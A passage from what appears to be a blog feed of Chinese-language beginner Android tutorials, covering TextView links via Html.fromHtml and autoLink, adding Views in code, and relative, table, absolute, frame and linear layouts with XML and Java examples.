class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Tv_Two"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@+id/Tv_One"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:autoLink</span>=<span class="string">"all"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们注意<code>android:autoLink=&quot;all&quot;</code>这个东西就是一个配置富文本框的一个属性，可以有下面这几个值：<br><em>设置是否当文本为URL链接/email/电话号码/map时，文本显示为可点击的链接。可选值(none/web/email/phone/map/all)</em><br>我们这里填写all就是所有的，而且之个东西支持HTML5的代码。<br>看我们的代码是如何编写的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> TextView Tv_One;</span><br><span class="line"><span class="keyword">private</span> TextView Tv_Two;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	setContentView(R.layout.activity_main);</span><br><span class="line">	Tv_One = (TextView) findViewById(R.id.Tv_One);</span><br><span class="line">	Tv_Two = (TextView) findViewById(R.id.Tv_Two);</span><br><span class="line">	String text1 = <span class="string">"&lt;font color = 'red'&gt;Hello Wker&lt;/font&gt;"</span>;</span><br><span class="line">	text1 += <span class="string">"&lt;a href = 'https://www.baidu.com'&gt;百度&lt;/a&gt;"</span>;</span><br><span class="line">	Tv_One.setText(Html.fromHtml(text1));</span><br><span class="line">	Tv_One.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//产生链接的效果</span></span><br><span class="line">	Tv_Two.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//产生链接的效果</span></span><br><span class="line">	Tv_Two.setText(<span class="string">"MyWeb:https://www.baidu.com 我的电话：13131313131"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们获取了这两个控件，然后我们配置一个HTML的一个语句，简单的就可以了，然后我们通过<code>Html.fromHtml(text1)</code>来获取一个Spanned的一个值，这个值就是实现了CharSquence接口，我们将它传过去，然后在设置可以产生连接，这个方法就是这么用，设置好之后我们就可以看一下效果：<br><img src="img1.jpg" alt="效果图"><br>但是需要注意的是我们之后XML中进行配置了我们才能可以解析，不配置的话呢只能解析一些简单的电话号网站之类的。并且当我们点击了蓝色的这些东西之后我们就能跳转到我们想要的地方去。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View</title>
    <url>/2020/02/01/Android-View/</url>
    <content><![CDATA[<h2 id="Android视图"><a href="#Android视图" class="headerlink" title="Android视图"></a>Android视图</h2><p>其实看到的这些空间就是一些View所派生出来的东西，包括这些布局也是派生出来的，但是布局所派生的直接父类是ViewGroup类，这个类支持添加View对象。<br>下面看一个实例。<br>首先看一下我的Layout XML。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_stduy1.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我并没有添加任何的组件，我们现在要通过代码的方式进行添加。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_stduy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.ActionBar.LayoutParams;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Color;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.text.Layout;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.RelativeLayout;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		View MainLayOut = View.inflate(<span class="keyword">this</span>, R.layout.activity_main, <span class="keyword">null</span>);</span><br><span class="line">		</span><br><span class="line">		TextView textView = <span class="keyword">new</span> TextView(<span class="keyword">this</span>);</span><br><span class="line">		LayoutParams layoutPar = <span class="keyword">new</span> LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.WRAP_CONTENT);</span><br><span class="line">		textView.setLayoutParams(layoutPar);</span><br><span class="line">		textView.setBackgroundColor(Color.GREEN);</span><br><span class="line">		textView.setText(<span class="string">"Hellow Word"</span>);</span><br><span class="line">		((ViewGroup)MainLayOut).addView(textView);</span><br><span class="line">		setContentView(MainLayOut);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">		getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">		<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">		<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">		<span class="keyword">int</span> id = item.getItemId();</span><br><span class="line">		<span class="keyword">if</span> (id == R.id.action_settings) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们这里没有使用哪个自带的加载布局的方式。</p>
<p>首先我们先new一个View的对象通过View类的一个静态方法inflate。<br>*<em>public View inflate ()<br>加载getLayoutResource()方法标识的布局资源，并通过加载布局资源替换父容器中它自己。<br>返回值：这个已加载的布局资源文件. *</em><br>这是一个API文档解释的。<br>反正这个东西就是返回一个加载的布局资源。<br>第一个参数就是一个设备上下文，我们用自身就好了，第二个就是一个资源ID，第三个暂时不是很清楚，但是写null也是可以的。<br>加载完布局资源之后，我们new一个TextView对象，就像我们在XML文件中进行设置的，我们也需要一个控件的布局，那就是我们需要一个LayoutParams对象，这个对象其实就是一个控件布局的一个对象，我们在构造方法中需要传入一个坐标类型的，就和我们在XML中设置的一样，我们使用这个类里面的一个常量就可以设置这个对象了。<br>然后在将我们的TextView设置这个布局，设置完毕之后我们简单的设置一下这个TextView对象，然后下面就是比较关键的一步了，我们需要将我们的控件添加到我们的LayOut中，但是由于我们的布局是View的对象我们需要进行强制转换成为ViewGroup类型的，这个时候我们才拥有了addView方法（其实转换成布局也是可以的），最后我们将我们的布局添加到我们的上下文对象中就可以了。<br>效果图：<br><img src="img1.jpg" alt="效果图"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android相对布局</title>
    <url>/2020/02/01/Android%E7%9B%B8%E5%AF%B9%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="相对布局"><a href="#相对布局" class="headerlink" title="相对布局"></a>相对布局</h2><p>相对布局还是很好用的，其实就是一个组件相对于另外一个组件的一个位置，我们只需要定好一个位置我们就可以推出来其他的位置。但是有一点就是需要注意的，由于我们需要相对性，所以我们需要ID，因此XML解析是需要顺序的，就是说我们如果这个控件是相对于那个控件的，那个控件就需要在我这个控件之前进行定义！<br>看一下示例代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/iv_icon"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"70dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"70dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"180dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"请输入账号"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@id/iv_icon"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/et_password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"180dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"请输入密码"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@id/et_account"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@id/iv_icon"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/register"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"注册账号"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"15dip"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/returnPassword"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"找回密码"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"45dip"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">CheckBox</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/remember"</span></span></span><br><span class="line"><span class="tag">   	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"记住密码"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/iv_icon"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/et_password"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">CheckBox</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/auto_Login"</span></span></span><br><span class="line"><span class="tag">   	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"自动登录"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/remember"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/et_password"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/Login"</span></span></span><br><span class="line"><span class="tag">    	<span class="attr">android:layout_width</span>=<span class="string">"300dip"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"登录"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/auto_Login"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_centerHorizontal</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>模仿QQ的一个登录界面</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android表格布局和绝对布局</title>
    <url>/2020/02/01/Android%E8%A1%A8%E6%A0%BC%E5%B8%83%E5%B1%80%E5%92%8C%E7%BB%9D%E5%AF%B9%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="表格布局"><a href="#表格布局" class="headerlink" title="表格布局"></a>表格布局</h2><p>这个布局不怎么用，我感觉不是很好用，就是有很多Row（行），每一行自己添加控件，就是这个样子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TableLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TableRow</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   		 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:text</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:gravity</span>=<span class="string">"center_horizontal"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:text</span>=<span class="string">"2"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:gravity</span>=<span class="string">"center_horizontal"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">TableRow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">TableLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是这个样子，<code>android:gravity=&quot;center_horizontal&quot;</code>这个就是居中显示。</p>
<h2 id="绝对布局"><a href="#绝对布局" class="headerlink" title="绝对布局"></a>绝对布局</h2><p>这个布局就是我们常见的Win32应用程序用的，我感觉挺好用的，但是他们说不怎么用，可能APP开发是有一定的特殊性的。很简单这个布局，就是拖拉控件，只有XY这两个属性比较重要。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">AbsoluteLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_x</span>=<span class="string">"12dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_y</span>=<span class="string">"18dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">AbsoluteLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个样子就可以了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android框架布局</title>
    <url>/2020/02/01/Android%E6%A1%86%E6%9E%B6%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="框架布局"><a href="#框架布局" class="headerlink" title="框架布局"></a>框架布局</h2><p>这个布局其实还是很简单的，就是一个栈类型的窗口重叠效果，就是最后加入的窗口在最顶层，先加入的在最底层。<br>在我们的LayoutXML中进行设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"220dip"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	   		 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	   		 <span class="attr">android:src</span>=<span class="string">"@drawable/ic_test"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/iv_play"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"35dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"35dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginTop</span>=<span class="string">"185dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">"bottom"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginBottom</span>=<span class="string">"30dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:visibility</span>=<span class="string">"visible"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span> /&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- gone和invisible的区别就是前者是直接删除，后者只是隐藏 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/btn_play"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"播放"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/btn_pause"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"暂停"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">          </span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里简单的介绍一下，就是说这个<code>layout_marginTop</code>就是一个距离顶部的距离，<code>layout_gravity</code>就是一个位置，<code>layout_marginBottom</code>这个也是一个距底部的位置，这个的话呢先要设置<code>layout_gravity</code>才可以。<br>然后我们可以这么写代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Button bu1;</span><br><span class="line">	<span class="keyword">private</span> Button bu2;</span><br><span class="line">	<span class="keyword">private</span> ImageView im1;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_2);</span><br><span class="line">		bu1 = (Button) findViewById(R.id.btn_play);</span><br><span class="line">		bu2 = (Button) findViewById(R.id.btn_pause);</span><br><span class="line">		im1 = (ImageView) findViewById(R.id.iv_play);</span><br><span class="line">		bu1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				im1.setVisibility(View.VISIBLE);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		bu2.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				im1.setVisibility(View.INVISIBLE);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就可以实现一个对应性的图片展示与显示了。<br>发现原来在添加图片的时候我们是不能有大写的，这个需要注意，刚发现的。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android线性布局</title>
    <url>/2020/02/01/Android%E7%BA%BF%E6%80%A7%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="线性布局"><a href="#线性布局" class="headerlink" title="线性布局"></a>线性布局</h2><p>这个布局就是生成一个新的Activity时自动生成的一个布局，也就是：<code>LinearLayout</code>布局，这个布局称之为线性布局，比较的简单，比如下面代码：</p>
